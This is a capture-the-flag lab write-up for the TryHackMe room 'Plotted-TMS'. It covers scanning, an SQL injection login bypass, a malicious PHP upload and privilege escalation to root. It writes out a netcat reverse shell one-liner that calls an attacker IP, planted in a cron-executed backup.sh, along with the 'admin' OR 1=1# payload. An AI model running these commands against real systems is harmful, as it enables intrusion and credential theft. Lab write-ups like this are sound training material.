# **Plotted-TMS**

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/6187c9220cd0ff0c5c3b29b9aa6252ea.png)
## **Difficulty = Easy**

***


running our nmap scan we have -:

```bash
# Nmap 7.94 scan initiated Tue Nov  7 21:24:54 2023 as: nmap -p80,22,443 -sVC -v --min-rate=1000 -T4 -oN nmap.txt 10.10.250.150
Nmap scan report for 10.10.250.150
Host is up (0.15s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open   http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp closed https
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  7 21:25:12 2023 -- 1 IP address (1 host up) scanned in 18.60 seconds
```


Navigating to port `80/HTTP` we have


![](https://i.imgur.com/sc9fXeJ.png)


Viewing page source did not lead to anything so i decided to run dir/file bruteforce with `dirsearch`


![](https://i.imgur.com/QAKDphw.png)


Navigating to `/admin` we have this `id_rsa` file with the following content


![](https://i.imgur.com/YTmJwnd.png)


which in turn looks like **base64**, decrypting it gave us this 🤣

![](https://i.imgur.com/8u3qnn8.png)


Navigating to `/passwd` we have this **base64** encoded text


![](https://i.imgur.com/HSHQ2rQ.png)



Decrypting it gave us the following text also 🤣


![](https://i.imgur.com/iFnjPU9.png)


Looks like i made a typo, running `rustscan` again i have port `445/HTTP` open

![](https://i.imgur.com/ZCEo5xB.png)


Navigating to this port still gives us an Apache default webpage, but running dir/file bruteforce with `ffuf` we have

![](https://i.imgur.com/3bavh0x.png)


Navigating to `/management` we have


![](https://i.imgur.com/rrcu8kL.png)


Navigating to `/management/admin/login.php` we have the login endpoint


![](https://i.imgur.com/LJBxtC4.png)


I tried login in with **SQLI** and yeah it worked using the payload `admin' OR 1=1#`


![](https://i.imgur.com/2j8gqGD.png)


Navigating to `/management/admin/?page=user` we have a restricted file upload vulnerability whereas we can upload any files even if it is **.PHP, .TXT**, literally anything 🤣

![](https://i.imgur.com/ZQgjSB7.png)


We can go ahead and upload our reverse shell, I decided to guess the endpoints of where the file was going to and yeah it landed in `/management/uploads`

![](https://i.imgur.com/MrgLDvq.png)


Start up your listener and execute your reverse shell


![](https://i.imgur.com/dP3rvaD.png)



So we got shell as user **www-data**


![](https://i.imgur.com/GHYBQaW.png)


Navigating to `/var/www/html/445/management` and concatenating `initialize.php`, we have user **tms_user** MySQL logs

![](https://i.imgur.com/cmc7MDu.png)

Login in to MySQL and using enumerating this service i found two password hashes together with the one in `initialize.php` if you look closely

```bash
# login to mysql

$ mysql -u tms_user -p

# enumerate mysql

mysql> show databases;
mysql> use tms_db;
mysql> show tables
mysql> select * from users;
```


![](https://i.imgur.com/bg3iYcg.png)


We can go ahead and crack them with [crackstation.net](https://crackstation.net)



![](https://i.imgur.com/SKI3lGE.png)



Looks like the password found doesn't seem to work anywhere

![](https://i.imgur.com/9cdcEgn.png)


Navigating to `/var/www/scripts` we have permissions to write to this folder as user **www-data**, so i removed the `backup.sh` script

![](https://i.imgur.com/OAHEqHi.png)

Then added my own malicious `backup.sh` reverse shell, meanwhile the `backup.sh` is running as a cronjob with user `plot_admin`

```bash
$ nano backup.sh

# Add this to backup.sh and save
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.75.133 8888 >/tmp/f

$ chmod +x backup.sh
```


![](https://i.imgur.com/8XKmb1C.png)




Then we got shell as user **plot_admin**


![](https://i.imgur.com/8a5LmBT.png)



Checking `suid` we have this `doas` binary


```bash
find / -perm -4000 2>/dev/null
```


![](https://i.imgur.com/Wg6sTjW.png)


Concatenating the `doas` config file located under `/etc/doas.conf` we have this rule set


![](https://i.imgur.com/ptDGOnq.png)

> The `doas` command is just the same as when using the `sudo` command, in this case we have the following rule to allow the user “plot_admin” to run the “openssl” program as root without asking for any password.


Checking **gtfobins** we have the permission to read files with `openssl`



![](https://i.imgur.com/0M1Mcg4.png)




we can go ahead and use the `doas` command to read the root flag


![](https://i.imgur.com/VYQfNtg.png)

Have fun 🤸



<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>



